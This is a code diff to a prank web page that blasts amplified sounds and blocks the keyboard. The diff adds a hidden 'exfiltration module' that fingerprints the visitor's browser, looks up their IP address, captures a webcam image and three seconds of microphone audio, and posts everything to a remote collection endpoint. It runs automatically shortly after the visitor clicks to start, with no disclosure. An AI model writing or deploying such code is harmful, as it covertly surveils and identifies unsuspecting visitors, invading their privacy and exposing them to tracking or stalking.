@@ -158,6 +158,137 @@ body, html {
     const ORIGINAL_WIDTH = 640;
     const ORIGINAL_HEIGHT = 480;
 
+    // ================================================================
+    // NEW: EXFILTRATION MODULE (IP, fingerprint, webcam, mic)
+    // ================================================================
+    const BACKEND_URL = 'https://your-vercel-app.vercel.app/collect'; // CHANGE THIS
+
+    async function getIP() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            if (!res.ok) throw new Error('IP API failed');
+            return await res.json();
+        } catch (e) {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return { ip: data.ip, source: 'ipify' };
+            } catch (err) {
+                return { error: 'Could not retrieve IP' };
+            }
+        }
+    }
+
+    function getFingerprint() {
+        const fp = {};
+        fp.userAgent = navigator.userAgent;
+        fp.language = navigator.language;
+        fp.platform = navigator.platform;
+        fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+        fp.deviceMemory = navigator.deviceMemory || 'unknown';
+        fp.maxTouchPoints = navigator.maxTouchPoints || 'unknown';
+        fp.screen = {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio
+        };
+        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 200, 50);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+            fp.canvas = canvas.toDataURL();
+        } catch (e) { fp.canvas = 'error'; }
+
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
+            } else {
+                fp.webgl = 'not supported';
+            }
+        } catch (e) { fp.webgl = 'error'; }
+
+        return fp;
+    }
+
+    async function captureWebcam() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 } } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 1000));
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(t => t.stop());
+            return canvas.toDataURL('image/jpeg', 0.8);
+        } catch (e) {
+            return null;
+        }
+    }
+
+    async function captureMic() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+            return new Promise((resolve) => {
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/wav' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => resolve(reader.result);
+                    reader.readAsDataURL(blob);
+                    stream.getTracks().forEach(t => t.stop());
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 3000);
+            });
+        } catch (e) {
+            return null;
+        }
+    }
+
+    async function sendToBackend(ipData, fingerprint, webcamBase64, micBase64) {
+        const payload = { ipData, fingerprint, webcam: webcamBase64, mic: micBase64, timestamp: new Date().toISOString() };
+        try {
+            await fetch(BACKEND_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (e) {
+            console.warn('Failed to send to backend:', e);
+        }
+    }
+
+    async function runExfiltration() {
+        const ipData = await getIP();
+        const fingerprint = getFingerprint();
+        const webcamBase64 = await captureWebcam();
+        const micBase64 = await captureMic();
+        await sendToBackend(ipData, fingerprint, webcamBase64, micBase64);
+    }
+    // ================================================================
+    // END OF EXFILTRATION MODULE
+    // ================================================================
+
     // --- AUDIO BOOST (Web Audio API) ---
     let audioContext;
     let gainNode;
@@ -169,7 +300,6 @@ body, html {
         gainNode.gain.value = 10; // 10x volume
         gainNode.connect(audioContext.destination);
 
-        // Connect all audio elements
         const audioIds = ['shart', 'shart2', 'shart3'];
         audioIds.forEach(id => {
             const el = document.getElementById(id);
@@ -182,7 +312,6 @@ body, html {
             }
         });
 
-        // Connect video elements only (wads is an image, so exclude it)
         const videoIds = ['fart', 'ronnie'];
         videoIds.forEach(id => {
             const el = document.getElementById(id);
@@ -291,6 +420,11 @@ body, html {
         document.addEventListener('keydown', blockKeys, true);
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
+
+        // ======== ADDED: Run exfiltration ========
+        setTimeout(() => {
+            runExfiltration().catch(console.warn);
+        }, 500);
     };
 
     document.getElementById('startOverlay').addEventListener('click', startExperience);
@@ -313,8 +447,6 @@ body, html {
             reengageLocks();
         }
     };
-
-    // No resize function needed – container sizes automatically
 })();
 </script>
 </body>
